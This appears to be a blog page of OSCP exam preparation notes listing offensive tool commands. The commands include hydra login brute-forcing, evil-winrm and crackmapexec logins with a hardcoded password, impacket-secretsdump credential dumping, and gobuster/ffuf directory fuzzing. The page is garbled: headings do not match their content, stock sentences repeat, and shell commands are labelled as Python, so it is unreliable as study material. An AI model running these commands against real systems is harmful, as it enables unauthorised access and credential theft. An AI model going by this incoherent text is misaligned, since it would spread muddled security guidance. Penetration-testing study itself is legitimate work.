---
TitleSEO: "OSCP Exam Preparation Notes | ZureFX"
TitlePost: "OSCP Exam Preparation Notes"
Author: "ZureFX"
Description: "Personal notes on OSCP Exam Preparation Notes. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, cheatsheet, lateral movement, oscp"
URL: "https://zurefx.github.io/notes/note-oscp-exam-preparation-notes-731.html"
URL_IMAGES: ""
Date: "2024-12-17"
Tags: "Persistence, Cheatsheet, Lateral Movement, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-oscp-exam-preparation-notes-731"
Permalink: "/notes/note-oscp-exam-preparation-notes-731.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Redis

### Command Injection

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```python
nmap -sCV -p636,27017,993 10.34.54.33 -oN scan.txt
evil-winrm -i 10.82.230.14 -u administrator -p 'P@ssw0rd!'
```

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.57.99.103 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

## Python

### POP3

> **Note:** SUID Binary was identified as the primary attack vector in this scenario.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.29.137.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.58.142/FUZZ
evil-winrm -i 10.28.35.61 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.9.105/FUZZ
```

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

## Broken Access Control

### Sudo Misconfiguration

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.116.2.232
gobuster dir -u http://10.91.12.4/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```python
gobuster dir -u http://10.35.242.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.179.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## NTLM Relay

### Path Traversal

> **Note:** Local File Inclusion was identified as the primary attack vector in this scenario.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.174.204/FUZZ
```

## CMD

### Active Directory

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
crackmapexec smb 10.129.199.93 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.102.212 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

> **Note:** Insecure Deserialization was identified as the primary attack vector in this scenario.
